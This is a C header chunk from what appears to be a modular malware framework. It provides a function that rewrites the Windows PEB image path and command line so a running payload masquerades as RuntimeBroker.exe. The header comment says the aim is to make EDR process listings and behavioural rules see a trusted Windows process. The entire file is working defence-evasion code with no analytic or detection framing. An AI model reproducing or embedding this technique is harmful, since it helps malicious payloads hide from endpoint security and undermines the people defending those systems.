// chunk: evasion/process_masquerade
// depends: (none)
// provides: masquerade_process
// headers: windows.h
// risk: medium
// note: Overwrites PEB ImagePathName and CommandLine to mimic RuntimeBroker.exe. EDR process listings and behavioral rules see a trusted Windows process instead of our payload.

#ifndef CHUNK_PROCESS_MASQUERADE
#define CHUNK_PROCESS_MASQUERADE

typedef struct _PM_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} PM_UNICODE_STRING;

static void masquerade_process(void) {
    static WCHAR fake_path[] = L"C:\\Windows\\System32\\RuntimeBroker.exe";
    static WCHAR fake_cmd[]  = L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding";

#ifdef _WIN64
    PVOID peb = (PVOID)__readgsqword(0x60);
    PVOID params = *(PVOID *)((BYTE *)peb + 0x20);
    PM_UNICODE_STRING *imgPath = (PM_UNICODE_STRING *)((BYTE *)params + 0x60);
    PM_UNICODE_STRING *cmdLine = (PM_UNICODE_STRING *)((BYTE *)params + 0x70);
#else
    PVOID peb = (PVOID)__readfsdword(0x30);
    PVOID params = *(PVOID *)((BYTE *)peb + 0x10);
    PM_UNICODE_STRING *imgPath = (PM_UNICODE_STRING *)((BYTE *)params + 0x38);
    PM_UNICODE_STRING *cmdLine = (PM_UNICODE_STRING *)((BYTE *)params + 0x40);
#endif

    imgPath->Buffer = fake_path;
    imgPath->Length = (USHORT)(wcslen(fake_path) * sizeof(WCHAR));
    imgPath->MaximumLength = imgPath->Length + sizeof(WCHAR);

    cmdLine->Buffer = fake_cmd;
    cmdLine->Length = (USHORT)(wcslen(fake_cmd) * sizeof(WCHAR));
    cmdLine->MaximumLength = cmdLine->Length + sizeof(WCHAR);
}

#endif
